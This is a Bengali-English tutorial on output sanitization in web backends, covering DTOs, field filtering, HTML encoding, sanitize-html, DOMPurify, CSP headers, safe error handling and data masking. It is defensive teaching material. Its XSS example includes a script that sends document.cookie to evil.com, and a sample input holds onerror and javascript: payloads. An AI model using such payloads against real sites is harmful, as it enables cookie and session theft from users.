# Output Sanitization (আউটপুট স্যানিটাইজেশন)

## Output Sanitization কী?

**Output Sanitization** হলো server থেকে client-এ data পাঠানোর **আগে** সেটাকে **safe ও clean** করা — যাতে sensitive data leak না হয়, malicious content execute না হয়, এবং user শুধু তাই দেখে যা দেখার কথা।

```
Input Validation  → Data ঢোকার সময় check (আগের chapter)
Output Sanitization → Data বের হওয়ার সময় clean

Database → Raw Data → Output Sanitization → Safe Response → Client
```

> **Input Validation** তোমার app-কে রক্ষা করে। **Output Sanitization** তোমার user-কে রক্ষা করে।

---

## কেন Output Sanitization দরকার?

### সমস্যা ১ — Sensitive Data Leak

```javascript
// ❌ Database-এর পুরো user object পাঠিয়ে দিচ্ছি
app.get('/api/users/:id', async (req, res) => {
    const user = await User.findById(req.params.id);
    res.json(user);
});

// Response-এ যা যাচ্ছে:
{
    "id": "u_789",
    "name": "Ripon",
    "email": "ripon@example.com",
    "password": "$2b$10$hashedpassword...",   // 😱 Password hash!
    "role": "admin",                           // 😱 Internal role!
    "resetToken": "abc123secret",              // 😱 Reset token!
    "loginAttempts": 3,                        // 😱 Internal data!
    "__v": 0,                                  // 😱 Mongoose version!
    "createdAt": "2026-01-01T00:00:00Z"
}
```

### সমস্যা ২ — XSS (Cross-Site Scripting)

```javascript
// User profile-এ নাম রাখলো:
// <script>document.location='https://evil.com/steal?cookie='+document.cookie</script>

// ❌ Sanitize না করে HTML-এ render করলে:
<h1>
  Welcome,{" "}
  <script>
    document.location='https://evil.com/steal?cookie='+document.cookie
  </script>
</h1>
// → Browser script execute করবে → Cookie চুরি!
```

### সমস্যা ৩ — Information Disclosure

```javascript
// ❌ Error-এ internal details পাঠানো
{
    "error": "SequelizeDatabaseError: relation \"users\" does not exist",
    "stack": "at Query.run (/app/node_modules/sequelize/lib/...",
    "database": "postgresql://admin:password123@db.internal:5432/myapp"
}
// → Attacker database type, credentials, internal path জেনে গেলো!
```

---

## Response Field Filtering

### সমস্যা: Database Object সরাসরি পাঠানো

```javascript
// Mongoose schema
const userSchema = new Schema({
  name: String,
  email: String,
  password: String, // ❌ এটা response-এ যাওয়া উচিত না
  resetToken: String, // ❌
  role: String, // ⚠️ Context-dependent
  loginAttempts: Number, // ❌
  isDeleted: Boolean, // ❌
  internalNotes: String, // ❌
});
```

### সমাধান ১ — Manual Field Selection

```javascript
app.get("/api/users/:id", async (req, res) => {
  const user = await User.findById(req.params.id);
  if (!user) return res.status(404).json({ error: "Not found" });

  res.json({
    id: user._id,
    name: user.name,
    email: user.email,
    createdAt: user.createdAt,
  });
});
```

### সমাধান ২ — Query Projection (Database Level)

```javascript
// MongoDB — শুধু দরকারি fields আনো
const user = await User.findById(id).select("name email createdAt");

// বা exclude করো
const user = await User.findById(id).select("-password -resetToken -__v");

// Prisma
const user = await prisma.user.findUnique({
  where: { id },
  select: { id: true, name: true, email: true, createdAt: true },
});

// Sequelize
const user = await User.findByPk(id, {
  attributes: ["id", "name", "email", "createdAt"],
});
```

### সমাধান ৩ — toJSON Transform (Schema Level)

```javascript
// Mongoose — schema-তে একবার configure করো, সব query-তে কাজ করবে
const userSchema = new Schema({
  name: String,
  email: String,
  password: String,
  resetToken: String,
});

userSchema.set("toJSON", {
  transform: (doc, ret) => {
    ret.id = ret._id;
    delete ret._id;
    delete ret.__v;
    delete ret.password;
    delete ret.resetToken;
    delete ret.loginAttempts;
    return ret;
  },
});

// এখন res.json(user) করলে automatically safe
```

### সমাধান ৪ — DTO (Data Transfer Object) Pattern

```javascript
class UserDTO {
  constructor(user) {
    this.id = user._id || user.id;
    this.name = user.name;
    this.email = user.email;
    this.createdAt = user.createdAt;
  }

  static from(user) {
    return new UserDTO(user);
  }

  static fromMany(users) {
    return users.map((u) => new UserDTO(u));
  }
}

// Usage
app.get("/api/users/:id", async (req, res) => {
  const user = await User.findById(req.params.id);
  res.json(UserDTO.from(user));
});

app.get("/api/users", async (req, res) => {
  const users = await User.find();
  res.json(UserDTO.fromMany(users));
});
```

### সমাধান ৫ — Role-Based Field Filtering

```javascript
class UserDTO {
  static publicFields(user) {
    return {
      id: user._id,
      name: user.name,
    };
  }

  static privateFields(user) {
    return {
      id: user._id,
      name: user.name,
      email: user.email,
      createdAt: user.createdAt,
    };
  }

  static adminFields(user) {
    return {
      id: user._id,
      name: user.name,
      email: user.email,
      role: user.role,
      isActive: user.isActive,
      loginAttempts: user.loginAttempts,
      createdAt: user.createdAt,
      updatedAt: user.updatedAt,
    };
  }
}

app.get("/api/users/:id", authenticate, async (req, res) => {
  const user = await User.findById(req.params.id);

  if (req.user.role === "admin") {
    return res.json(UserDTO.adminFields(user));
  }
  if (req.user.id === user.id) {
    return res.json(UserDTO.privateFields(user));
  }
  return res.json(UserDTO.publicFields(user));
});
```

---

## XSS Prevention (Output Encoding)

### XSS কীভাবে কাজ করে?

```
1. Attacker malicious script inject করে (input হিসেবে)
2. Server সেটা database-এ save করে
3. অন্য user যখন page visit করে, server সেই data render করে
4. Browser script execute করে → Cookie চুরি, redirect, keylogging
```

```
XSS Types:
─────────────────────────────────────────────
Stored XSS    → Database-এ save → অন্য user-এ execute
Reflected XSS → URL parameter-এ inject → একই request-এ execute
DOM-based XSS → Client-side JavaScript-এ inject
```

### HTML Entity Encoding

```javascript
function escapeHtml(str) {
  const map = {
    "&": "&amp;",
    "<": "&lt;",
    ">": "&gt;",
    '"': "&quot;",
    "'": "&#039;",
    "/": "&#x2F;",
  };
  return str.replace(/[&<>"'/]/g, (char) => map[char]);
}

// Input:  <script>alert('xss')</script>
// Output: &lt;script&gt;alert(&#039;xss&#039;)&lt;/script&gt;
// Browser-এ দেখাবে: <script>alert('xss')</script> (text হিসেবে, execute হবে না)
```

### Context-Specific Encoding

```
Output Context         Encoding Method           উদাহরণ
──────────────────────────────────────────────────────────────
HTML Body              HTML Entity Encode         &lt;script&gt;
HTML Attribute         Attribute Encode           &quot;onload=...
JavaScript String      JS Escape                  \x3Cscript\x3E
URL Parameter          URL Encode (encodeURI)     %3Cscript%3E
CSS Value              CSS Escape                 \3C script\3E
JSON                   JSON.stringify()           (auto-escaped)
```

```javascript
// HTML context
const safeName = escapeHtml(user.name);
const html = `<h1>Welcome, ${safeName}</h1>`;

// URL context
const safeQuery = encodeURIComponent(user.searchTerm);
const url = `https://example.com/search?q=${safeQuery}`;

// JavaScript context
const safeData = JSON.stringify(user.name);
const script = `<script>var name = ${safeData};</script>`;

// HTML Attribute context
const safeAttr = escapeHtml(user.bio);
const tag = `<div data-bio="${safeAttr}">`;
```

### sanitize-html Library

User-generated **rich text** (blog post, comment) allow করতে চাইলে:

```bash
npm install sanitize-html
```

```javascript
const sanitizeHtml = require("sanitize-html");

const userContent = `
    <h1>My Blog Post</h1>
    <p>This is <strong>great</strong>!</p>
    <script>alert('xss')</script>
    <img src=x onerror="alert('xss')">
    <a href="javascript:alert('xss')">Click me</a>
    <iframe src="https://evil.com"></iframe>
`;

const clean = sanitizeHtml(userContent, {
  allowedTags: [
    "h1",
    "h2",
    "h3",
    "p",
    "b",
    "i",
    "em",
    "strong",
    "a",
    "ul",
    "ol",
    "li",
    "br",
  ],
  allowedAttributes: {
    a: ["href"],
  },
  allowedSchemes: ["http", "https"], // javascript: scheme block
  disallowedTagsMode: "discard",
});

// Output:
// <h1>My Blog Post</h1>
// <p>This is <strong>great</strong>!</p>
//
//
// <a>Click me</a>
//
// → script, iframe, onerror, javascript: সব removed!
```

### DOMPurify (Client-Side)

```javascript
import DOMPurify from "dompurify";

const dirty = '<p>Hello</p><script>alert("xss")</script>';
const clean = DOMPurify.sanitize(dirty);
// Output: <p>Hello</p>

// React-এ:
function Comment({ content }) {
  const clean = DOMPurify.sanitize(content);
  return <div dangerouslySetInnerHTML={{ __html: clean }} />;
}
```

---

## Error Response Sanitization

### ❌ Internal Details Expose করা

```javascript
app.use((err, req, res, next) => {
  res.status(500).json({
    error: err.message,
    stack: err.stack, // 😱 Internal file paths!
    query: err.sql, // 😱 SQL query!
    database: process.env.DATABASE_URL, // 😱 Credentials!
  });
});
```

### ✅ Safe Error Response

```javascript
app.use((err, req, res, next) => {
  // Internal log — সব detail রাখো
  logger.error({
    message: err.message,
    stack: err.stack,
    sql: err.sql,
    requestId: req.id,
    userId: req.user?.id,
  });

  // Client response — generic message
  if (err.isOperational) {
    return res.status(err.statusCode).json({
      status: "error",
      error: {
        code: err.errorCode,
        message: err.message,
      },
    });
  }

  // Programming error — NEVER expose details
  res.status(500).json({
    status: "error",
    error: {
      code: "INTERNAL_ERROR",
      message: "Something went wrong. Please try again.",
    },
  });
});
```

### Development vs Production

```javascript
function errorHandler(err, req, res, next) {
  const response = {
    status: "error",
    error: {
      code: err.errorCode || "INTERNAL_ERROR",
      message: err.isOperational ? err.message : "Something went wrong",
    },
  };

  // Development-এ extra details দেখাও (debugging-এ সুবিধা)
  if (process.env.NODE_ENV === "development") {
    response.error.stack = err.stack;
    response.error.details = err.details;
  }

  res.status(err.statusCode || 500).json(response);
}
```

---

## Response Headers Sanitization

### Security Headers

```javascript
const helmet = require("helmet");
app.use(helmet());

// helmet যা করে:
// X-Content-Type-Options: nosniff     → MIME type sniffing বন্ধ
// X-Frame-Options: DENY               → Clickjacking prevention
// X-XSS-Protection: 0                 → Browser XSS filter (deprecated but safe)
// Content-Security-Policy             → Script source control
// Strict-Transport-Security           → Force HTTPS
// Referrer-Policy: no-referrer        → Referrer leak বন্ধ
```

### Content-Security-Policy (CSP)

XSS prevention-এর সবচেয়ে powerful header:

```javascript
app.use(
  helmet.contentSecurityPolicy({
    directives: {
      defaultSrc: ["'self'"],
      scriptSrc: ["'self'"], // শুধু নিজের domain-এর script
      styleSrc: ["'self'", "'unsafe-inline'"],
      imgSrc: ["'self'", "https://cdn.example.com"],
      connectSrc: ["'self'", "https://api.example.com"],
      fontSrc: ["'self'", "https://fonts.googleapis.com"],
      objectSrc: ["'none'"], // Flash/plugins block
      frameAncestors: ["'none'"], // iframe-এ embed block
      upgradeInsecureRequests: [],
    },
  }),
);
```

```
CSP কীভাবে XSS রোধ করে:
──────────────────────────────────────
scriptSrc: ["'self'"]

মানে শুধু তোমার domain-এর script চলবে।
Attacker inject করলেও inline <script> execute হবে না!

Browser console-এ দেখবে:
"Refused to execute inline script because it violates
 the Content Security Policy directive: script-src 'self'"
```

---

## Sensitive Data Masking in Responses

### API Response-এ Masking

```javascript
function maskEmail(email) {
  const [name, domain] = email.split("@");
  return `${name[0]}${"*".repeat(name.length - 1)}@${domain}`;
}

function maskPhone(phone) {
  return phone.slice(0, 3) + "****" + phone.slice(-2);
}

function maskCard(card) {
  return "**** **** **** " + card.slice(-4);
}

// Usage in API response
app.get("/api/account", authenticate, async (req, res) => {
  const user = await User.findById(req.user.id);
  const card = await PaymentMethod.findOne({ userId: user.id });

  res.json({
    name: user.name,
    email: maskEmail(user.email), // r****@example.com
    phone: maskPhone(user.phone), // 017****89
    card: card ? maskCard(card.number) : null, // **** **** **** 1234
  });
});
```

### Conditional Masking

```javascript
function sanitizeUser(user, viewer) {
  const base = {
    id: user.id,
    name: user.name,
    avatar: user.avatar,
  };

  // নিজের profile দেখলে full data
  if (viewer.id === user.id) {
    return {
      ...base,
      email: user.email,
      phone: user.phone,
      address: user.address,
    };
  }

  // অন্যের profile দেখলে masked
  return {
    ...base,
    email: maskEmail(user.email),
    phone: user.phone ? maskPhone(user.phone) : null,
  };
}
```

---

## JSON Response Sanitization

### Unwanted Fields Strip করা

```javascript
function sanitizeResponse(data, allowedFields) {
  if (Array.isArray(data)) {
    return data.map((item) => sanitizeResponse(item, allowedFields));
  }

  if (data && typeof data === "object") {
    const sanitized = {};
    for (const field of allowedFields) {
      if (field in data) {
        sanitized[field] = data[field];
      }
    }
    return sanitized;
  }

  return data;
}

// Usage
const allowedUserFields = ["id", "name", "email", "createdAt"];

app.get("/api/users", async (req, res) => {
  const users = await User.find();
  res.json(sanitizeResponse(users, allowedUserFields));
});
```

### Deep Sanitization (Nested Objects)

```javascript
function deepSanitize(obj, blocklist = []) {
  if (obj === null || typeof obj !== "object") return obj;
  if (Array.isArray(obj))
    return obj.map((item) => deepSanitize(item, blocklist));

  const result = {};
  for (const [key, value] of Object.entries(obj)) {
    if (blocklist.includes(key)) continue;
    result[key] = deepSanitize(value, blocklist);
  }
  return result;
}

const BLOCKLIST = ["password", "resetToken", "__v", "internalNotes", "salt"];

app.get("/api/data", async (req, res) => {
  const data = await getData();
  res.json(deepSanitize(data, BLOCKLIST));
});
```

---

## Python — Output Sanitization

### Pydantic Response Model

```python
from pydantic import BaseModel, EmailStr
from typing import Optional
from datetime import datetime

class UserResponse(BaseModel):
    id: str
    name: str
    email: EmailStr
    created_at: datetime

    class Config:
        from_attributes = True  # ORM object থেকে auto-convert

class UserPublicResponse(BaseModel):
    id: str
    name: str

@app.get("/api/users/{user_id}", response_model=UserResponse)
async def get_user(user_id: str):
    user = await db.get_user(user_id)
    return user
    # FastAPI automatically UserResponse-এ নেই এমন field (password, role) বাদ দেয়!
```

### Jinja2 Template Auto-Escaping

```python
from markupsafe import escape

name = "<script>alert('xss')</script>"
safe_name = escape(name)
# Output: &lt;script&gt;alert(&#39;xss&#39;)&lt;/script&gt;

# Jinja2 by default auto-escape করে:
# {{ user.name }}  → auto-escaped
# {{ user.name | safe }}  → ⚠️ raw output (careful!)
```

---

## Framework-Specific Auto-Escaping

```
Framework        Auto-Escape?     Raw Output (dangerous)
──────────────────────────────────────────────────────────
React (JSX)      ✅ Yes           dangerouslySetInnerHTML
Vue.js           ✅ {{ }}         v-html
Angular          ✅ {{ }}         [innerHTML] (sanitized)
Django/Jinja2    ✅ {{ }}         {{ var | safe }}
EJS              ❌ <%= %>        <%- %> (unescaped)
Handlebars       ✅ {{ }}         {{{ }}} (triple = raw)
Pug              ✅ #{var}        !{var} (raw)
```

```
✅ সবসময় auto-escaped version ব্যবহার করো
❌ Raw/unsafe output শুধু তখনই যখন content 100% trusted ও sanitized
```

---

## Output Sanitization Checklist

```
Response Body:
  ✅ Database object সরাসরি return করো না — DTO/projection ব্যবহার করো
  ✅ password, token, internal fields strip করো
  ✅ Role-based field filtering — viewer অনুযায়ী data দাও
  ✅ Sensitive data mask করো (email, phone, card)
  ✅ User-generated content HTML escape/sanitize করো

Error Responses:
  ✅ Stack trace production-এ পাঠাবে না
  ✅ Database query/connection details পাঠাবে না
  ✅ Internal file paths পাঠাবে না
  ✅ Generic message দাও, details শুধু log-এ

Headers:
  ✅ helmet() ব্যবহার করো
  ✅ Content-Security-Policy configure করো
  ✅ Server/X-Powered-By header remove করো
  ✅ CORS properly configure করো

Templates:
  ✅ Auto-escaping enable আছে কিনা check করো
  ✅ Raw/unsafe output avoid করো
  ✅ User input-কে trust করো না — always escape
```

---

## Input Validation vs Output Sanitization — সম্পূর্ণ Flow

```
Request (User Input)
    │
    ▼
┌──────────────────┐
│ Input Validation  │  → Type, format, range check
│ (Joi/Zod/Pydantic)│  → Reject invalid data (400)
└────────┬─────────┘
         │ (valid data)
         ▼
┌──────────────────┐
│  Input Sanitize   │  → trim, lowercase, escape
│                    │  → Parameterized queries
└────────┬─────────┘
         │ (clean data)
         ▼
┌──────────────────┐
│  Business Logic   │  → Process, calculate, save
│  + Database       │
└────────┬─────────┘
         │ (raw result)
         ▼
┌──────────────────┐
│ Output Sanitize   │  → Strip sensitive fields (password, token)
│ (DTO / Filter)    │  → Mask PII (email, phone, card)
│                    │  → HTML encode user content
│                    │  → Safe error messages
└────────┬─────────┘
         │ (safe response)
         ▼
   Response to Client
```

---

## সংক্ষেপে মনে রাখার সূত্র

```
Output Sanitization = Response পাঠানোর আগে data safe করা

3 মূল কাজ:
  1. Field Filtering → sensitive fields বাদ দাও (password, token)
  2. Content Encoding → XSS prevention (HTML escape)
  3. Error Masking → internal details লুকাও

Field Filtering Methods:
  Query Projection → .select('name email')
  toJSON Transform → Schema-level auto-strip
  DTO Pattern → Explicit field mapping
  Role-Based → viewer অনুযায়ী different fields

XSS Prevention:
  HTML Entity Encoding → < becomes &lt;
  sanitize-html → Rich text-এ allowed tags only
  CSP Header → Browser-level script control
  Framework auto-escape → React/Vue/Angular default safe

Error Response:
  Production → Generic message only
  Development → Stack trace + details
  Log-এ → সব detail রাখো

Golden Rule:
  Input Validation → তোমার APP রক্ষা করে
  Output Sanitization → তোমার USER রক্ষা করে
```

---

## Interview Golden Lines

> **Input Validation protects your application. Output Sanitization protects your users.**

> **Never return database objects directly — use DTOs or projections to strip sensitive fields like passwords and tokens.**

> **Context-specific encoding is crucial: HTML body needs entity encoding, URLs need percent encoding, JavaScript needs JS escaping.**

> **Content-Security-Policy is the most powerful defense against XSS — it tells the browser which scripts are allowed to execute.**

> **Production error responses should never include stack traces, SQL queries, or internal paths — log them server-side, send generic messages to clients.**
